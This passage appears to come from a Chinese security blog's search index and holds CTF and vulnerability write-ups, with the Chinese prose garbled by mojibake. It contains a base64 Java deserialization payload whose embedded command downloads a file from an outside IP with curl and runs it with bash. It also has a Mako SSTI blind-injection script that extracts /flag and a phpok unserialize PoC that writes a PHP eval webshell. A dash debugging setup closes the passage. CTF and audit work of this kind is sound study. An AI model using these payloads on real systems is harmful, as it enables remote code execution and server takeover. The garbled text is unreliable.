nMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2bkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAYTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2bAYIVOACAAB4cAAABXXK/rq%2bAAAANAAuCgAHAB8KACAAIQgAIgoAIAAjCAAkBwAlBwAmAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMZXZpbDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ%2bAQADKClWBwAoAQAKU291cmNlRmlsZQEACWV2aWwuamF2YQwAGgAbBwApDAAqACsBADBjdXJsIC1vIC90bXAvc3VhbnZlIGh0dHA6Ly8zNi4yNTUuMjIxLjE1Njo5MDEvMSAMACwALQEAEGJhc2ggL3RtcC9zdWFudmUBAARldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAADAAEACAAJAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAMAAwAAAAgAAMAAAABAA0ADgAAAAAAAQAPABAAAQAAAAEAEQASAAIAEwAAAAQAAQAUAAEACAAVAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAOAAwAAAAqAAQAAAABAA0ADgAAAAAAAQAPABAAAQAAAAEAFgAXAAIAAAABABgAGQADABMAAAAEAAEAFAABABoAGwACAAoAAABNAAIAAQAAABcqtwABuAACEgO2AARXuAACEgW2AARXsQAAAAIACwAAABIABAAAABAABAATAA0AFAAWABYADAAAAAwAAQAAABcADQAOAAAAEwAAAAQAAQAcAAEAHQAAAAIAHnB0ABJIZWxsb1RlbXBsYXRlc0ltcGxwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBzcgARamF2YS51dGlsLlRyZWVNYXAMwfY%2bLSVq5gMAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBwdwQAAAAAeHh0AAMxMjN4 2 æ‰§è¡Œæ–‡ä»¶ 123456789101112131415POST /bf2dcf6664b16e0efe471b2eac2b54b2 HTTP/1.1Host: 124.71.189.248:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1cmd: idOrigin: foo.example.orgContent-Type: application/x-www-form-urlencodedContent-Length: 3742rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuRmFzdEhhc2hNYXDPVCYVgxGIjgIAAloABGZhc3RMAANtYXB0ABNMamF2YS91dGlsL0hhc2hNYXA7eHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4AHNxAH4AAj9AAAAAAAAMdwgAAAAQAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2tleXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2bAAZ4cHZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2bkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAYTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2bAYIVOACAAB4cAAABTLK/rq%2bAAAANAAsCgAGAB4KAB8AIAgAIQoAHwAiBwAjBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMZXZpbDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ%2bAQADKClWBwAmAQAKU291cmNlRmlsZQEACWV2aWwuamF2YQwAGQAaBwAnDAAoACkBABBiYXNoIC90bXAvc3VhbnZlDAAqACsBAARldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAMAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAABAABAAUAA0AFgALAAAADAABAAAADgAMAA0AAAASAAAABAABABsAAQAcAAAAAgAdcHQAEkhlbGxvVGVtcGxhdGVzSW1wbHB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuVHJlZU1hcAzB9j4tJWrmAwABTAAKY29tcGFyYXRvcnQAFkxqYXZhL3V0aWwvQ29tcGFyYXRvcjt4cHB3BAAAAAB4eHQAAzEyM3g%3d ååºåˆ—åŒ– baby gadget v2.0â€™ revengeStatus: CompletedTag: WEB ç›¸å…³èµ„æ–™/åœ°å€ åŒä¸Šé¢˜ HTML practicemako ssti ä¸å‡ºç½‘ç›²æ³¨ 123% for i in range(0,self.module.runtime.util.os.system(set(pageargs.values()).pop())):123% endfor å½“å‘½ä»¤æ‰§è¡ŒæˆåŠŸ åˆ™æ˜¾ç¤º123 å¦åˆ™ æ˜¾ç¤ºå¤šä¸ª123 123456789101112131415161718192021222324import requestsimport stringimport urllib.parseurl=&quot;http://124.71.178.252/view/vnA8UID0QS7X2FtwsBTop15HNm6hfzbx.html?name=&quot;payload1=&quot;sleep $(cat /flag|base64 -w0|cut -c {}|tr {} 5)&quot;payload1 =&quot;&quot;&quot;if [ $(printf &quot;%d&quot; &quot;'$(cat /flag|cut -c {})&quot;) -eq {} ];then sleep 3;fi&quot;&quot;&quot;# payload2=&quot;if test $(cat /flag|cut -c {}) = {};then sleep 3;fi&quot;s=string.ascii_letters+string.digits+'{@~^*_+-\\'\\&quot;?/\\\\&lt;&gt;}'# s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;flag=''for i in range(7,100): f=flag for j in range(48,128): try: u=url+urllib.parse.quote(payload1.format(str(i),j)) r=requests.get(u,timeout=1.8) except requests.exceptions.ReadTimeout as e: flag=flag+chr(j) print(chr(j)) break if f==flag: breakprint(flag) æ–­æ–­ç»­ç»­è·‘næ¬¡","link":"/2022/03/01/SUSCTF2022-web-writeup/"},{"title":"phpok6.0-å‰å°ååºåˆ—åŒ–æ¼æ´getshell","text":"0x0 å‰è¨€è¿™ä¸¤å¤©æ¥æ­å·æ‰“è¥¿æ¹–è®ºå‰‘äº†ï¼Œä¸€ä¸ªä½ç‰ˆæœ¬çš„phpokä¸€ä¸ªé«˜ç‰ˆæœ¬çš„phpok ä½ç‰ˆæœ¬ndayé€šäº† é«˜ç‰ˆæœ¬ä¸€ç›´æ²¡å®¡è®¡å‡ºæ¥ ä»Šå¤©ä¸Šåˆåœ¨å®‰æ’å¤§å¦å¬äº†è®²è§£ ä¸»åŠæ–¹è¯´ä¸å…¬å¼€äº† ä½†æ˜¯æœ‰äººåšå‡ºæ¥äº† äº’è”ç½‘ä¸Šå¾ˆå¿«å°±ä¼šæœ‰é¢˜è§£äº†ã€‚ çœ‹åˆ°äº†pocå¤§æ¦‚çš„æ ·å­ å›åˆè‚¥è·¯ä¸Šè°ƒäº†ä¸€ä¸‹ 0x1 é¿å‘æœ€æ–°ç‰ˆçš„phpokç›´æ¥æ­å»ºè·‘ä¸èµ·æ¥ å¯èƒ½æ˜¯å› ä¸ºæˆ‘macï¼Ÿ å¤ç°çš„å¸ˆå‚…ä»¬å¯ä»¥æŠŠè¿™é‡Œæ³¨é‡Šä¸€ä¸‹ï¼ˆæˆ‘æ‡’ ä¸æƒ³æ‰¾åŸå›  0x2 æ€è·¯å¤§æ¦‚çœ‹äº†ä¸€ä¸‹é€»è¾‘ è¿™ä¸ªæ¡†æ¶ cæ˜¯æ§åˆ¶å™¨ fæ˜¯æ–¹æ³• ä»£ç éƒ½åœ¨framework æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œå¦‚å›¾ framework/admin/login_control.phpçš„ index_fæ–¹æ³• å¯¹åº”çš„urlå°±æ˜¯ /admin.php?c=login&amp;f=index ä¸»åŠæ–¹é‚£ä¸ªurlæˆ‘çœ‹åˆ°äº† æ˜¯admin.php?c=login&amp;f=update è·Ÿè¿›å»çœ‹äº†ä¸€çœ¼ä»£ç  å¯ç–‘ç‚¹å°±åœ¨decode è·Ÿè¿›å‘ç°ååºåˆ—åŒ– ã€‚ã€‚ã€‚ç®€å•çš„æœ‰ç‚¹ç¦»è°± è¿˜æ˜¯åƒäº†ä¹ æƒ¯çœ‹å‰å°æ§åˆ¶å™¨çš„äºâ€¦. ä»¥åå¤šç»†å¿ƒç‚¹å§ ï¼ˆæ­¤å¤„å“èµ·äº†kğŸ‘´ğŸ‘´rçš„å£°éŸ³ï¼šä½ ä¸ºä»€ä¹ˆä¸ä¼šï¼Ÿè¿˜ä¸æ˜¯å› ä¸ºä½ èœ 0x3 pocæŠŠtokenå’Œfileå¯¹åº”çš„æ–‡ä»¶å¤åˆ¶è¿‡æ¥ 1234567891011121314151617181920&lt;?phprequire &quot;./token.php&quot;;require &quot;./file.php&quot;;class cache{ protected $key_id='suanve'; protected $key_list='aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW29zd29yZF0pOz8+'; protected $folder='php://filter/write=string.strip_tags|convert.base64-decode/resource=';}//echo base64_encode(serialize(new cache()));$token = new token_lib();$file = new file_lib();$keyid = $file-&gt;cat(&quot;./index.php&quot;);$token-&gt;keyid($keyid);echo $token-&gt;encode(new cache()); ä¸Šè½¦çš„æ—¶å€™æç”µè„‘å¼€å§‹çœ‹çš„,å†™å¥½è¿™ç¯‡åšå®¢åˆ°ä¸½æ°´ç«™äº†â€¦.æ¯”èµ›çš„æ—¶å€™æˆ‘å¯æ˜¯å®¡åˆ°æ—©ä¸Š3ç‚¹å•Šâ€¦.","link":"/2022/03/13/phpok6-0-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/"},{"title":"dashåˆ†æ-0x0ç¯å¢ƒæ­å»º","text":"0x0å‰è¨€è™ç¬¦æ¯”èµ›é‡åˆ°äº†ä¸€é¢˜æå…¶ç±»ä¼¼pç¥åšè¿‡çš„é¢˜ï¼Œåªæ˜¯åº•å±‚æ“ä½œç³»ç»Ÿæ˜¯Debianï¼Œæ— æ³•ä½¿ç”¨pç¥çš„æ€è·¯è§£å†³ã€‚ æœ¬ç€é‡åˆ°äº†å°±è°ƒä¸€è°ƒçš„ç²¾ç¥ å°è¯•äº†ä¸€ä¸‹è°ƒè¯• éªŒè¯pç¥çš„æ“ä½œ ä¹Ÿè¯•ç€â€œå®Œæˆpç¥æœªå®Œæˆä¹‹è·¯â€ è°ƒè¯•æ‰€éœ€ç¯å¢ƒ: Macos CLion Vscode php 1&lt;?php (empty($_GET[&quot;env&quot;])) ? highlight_file(__FILE__) : putenv($_GET[&quot;env&quot;]) &amp;&amp; system('echo hfctf2022');?&gt; nginx/default.php 1234567891011121314server { listen 80 default_server; listen [::]:80 default_server; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass 127.0.0.1:9000; }} Dockerfile 1234567891011121314151617181920212223FROM php:7.4.28-fpm-busterLABEL Maintainer=&quot;yxxx&quot;ENV REFRESHED_AT 2022-03-14ENV LANG C.UTF-8RUN sed -i 's/http:\\/\\/security.debian.org/http:\\/\\/mirrors.163.com/g' /etc/apt/sources.listRUN sed -i 's/http:\\/\\/deb.debian.org/http:\\/\\/mirrors.163.com/g' /etc/apt/sources.listRUN apt upgrade -y &amp;&amp; \\ apt update -y &amp;&amp; \\ apt install nginx -yENV DEBIAN_FRONTEND noninteractiveCOPY index.php /var/www/htmlCOPY default.conf /etc/nginx/sites-available/defaultCOPY flag /flagEXPOSE 80CMD php-fpm -D &amp;&amp; nginx -g 'daemon off;' 0x1æºç è·å–https://command-not-found.com/ è¿™ä¸ªç½‘ç«™å¯ä»¥è¾“å…¥å‘½ä»¤æ¥è·å–è¯¥å‘½ä»¤å¯¹åº”çš„è½¯ä»¶åŒ… æ¯”å¦‚æˆ‘ä»¬è¾“å…¥echo å¯ä»¥å‘ç°ç½‘ç«™æç¤ºäº†åœ¨å„ç§ç¼–ç¨‹è¯­è¨€ä¸‹è·å–è¯¥è½¯ä»¶çš„æ–¹å¼ å› ä¸ºèµ›é¢˜ç¯å¢ƒæ˜¯debianæˆ‘ä»¬å‰å¾€Debian Packageæœç´¢coreutils æœç´¢åä¼šå‘ç°Debian Packageæä¾›äº†å®Œæ•´åŒ¹é…å’Œéƒ¨åˆ†åŒ¹é…çš„è½¯ä»¶åŒ…åœ°å€ ç‚¹å‡»å®Œæ•´åŒ¹é…å¯¹åº”çš„è½¯ä»¶åŒ…è·¯å¾„ å¯ä»¥çœ‹åˆ°ç½‘ç«™å³ä¾§å³å¯ä¸‹è½½æºç  å¦‚æœæˆ‘ä»¬æƒ³ç¡®å®šæˆ‘ä»¬ç›®æ ‡ç¯å¢ƒä¸­coreutilsçš„ç‰ˆæœ¬ å¯ä»¥ä½¿ç”¨dpkg -lçš„æ–¹å¼æ¥æ£€ç´¢è½¯ä»¶åŒ…ç‰ˆæœ¬ 0x2dashè°ƒè¯•ç¯å¢ƒæ­å»ºdashæºç è·å–é€”å¾„å¦‚0x1èŠ‚ è§£å‹åè¿›å…¥ç›®å½• cd /Users/su/Desktop/code/c/dash-0.5.10.2/ æˆ‘ä»¬é¦–å…ˆç¼–è¯‘dash å¹¶æ·»åŠ è°ƒè¯•ç¬¦å· 123CFLAGS=&quot;-g&quot; ./configure --prefix=/Users/su/Desktop/code/c/dash-0.5.10.2/ &amp;&amp; \\make &amp;&amp; \\make install ç­‰å¾…ç¼–è¯‘å®Œæˆååœ¨å½“å‰ç›®å½•ä¸‹ä¼šå‡ºç°binç›®å½• ç›®å½•ä¸­å­˜æ”¾ç€dashçš„å¯æ‰§è¡Œæ–‡ä»¶ è¿è¡Œä¸€ä¸‹æµ‹è¯• æˆ‘ä»¬éœ€è¦åœ¨vscodeä¸­å®‰è£…c/c++æ‰©å±• éšååœ¨Debugèœå•ä¸­é€‰æ‹©åˆ›å»ºlaunch.json ç„¶åé€‰æ‹©C++(GDB/LLDB) åœ¨ç”Ÿæˆçš„jsonæ–‡ä»¶ä¸­æ·»åŠ è°ƒè¯•ä¿¡æ¯ 1234567891011121314151617181920212223242526{ // ä½¿ç”¨ IntelliSense äº†è§£ç›¸å…³å±æ€§ã€‚ // æ‚¬åœä»¥æŸ¥çœ‹ç°æœ‰å±æ€§çš„æè¿°ã€‚ // æ¬²äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [{ &quot;name&quot;: &quot;Debug&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;/Users/su/Desktop/code/c/dash-0.5.10.2/bin/dash&quot;, //è¿™é‡ŒæŒ‡å‘ç¼–è¯‘å¥½çš„æ–‡ä»¶ &quot;args&quot;: [ // è¿™é‡Œæ˜¯è¿è¡Œæ—¶çš„å‚æ•°ã€‚å› ä¸ºèµ›é¢˜æ‰§è¡Œäº†dash -c 'echo xxxx' æ‰€ä»¥éœ€è¦é…ç½®ä¸€ä¸‹ &quot;-c&quot;, &quot;echo suanve&quot; ], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;${fileDirname}&quot;, &quot;environment&quot;: [ { &quot;name&quot;: &quot;test&quot;, &quot;value&quot;: &quot;test&quot; }, ], &quot;externalConsole&quot;: false, &quot;MIMode&quot;: &quot;lldb&quot; }]} é…ç½®å®Œæˆä¿å­˜ æ‰“å¼€src/main.cæ‰¾åˆ°ä¸»å‡½æ•°ä¸‹ä¸€ä¸ªæ–­ç‚¹ ç‚¹å‡»è°ƒè¯•å³å¯æ–­åœ¨mainå‡½æ•°","link":"/2022/03/21/dash%E5%88%86%E6%9E%90-0x0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"php","slug":"php","link":"/tags/php/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","link":"/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"pbootcms","slug":"pbootcms","link":"/tags/pbootcms/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"SUSCTF2022","slug":"SUSCTF2022","link":"/tags/SUSCTF2022/"},{"name":"EDISEC","slug":"EDISEC","link":"/tags/EDISEC/"},{"name":"dash","slug":"dash","link":"/tags/dash/"},{"name":"vscode","slug":"vscode","link":"/tags/vscode/"},{"name":"è°ƒè¯•","slug":"è°ƒè¯•","link":"/tags/%E8%B0%83%E8%AF%95/"}],"categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","link":"/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]}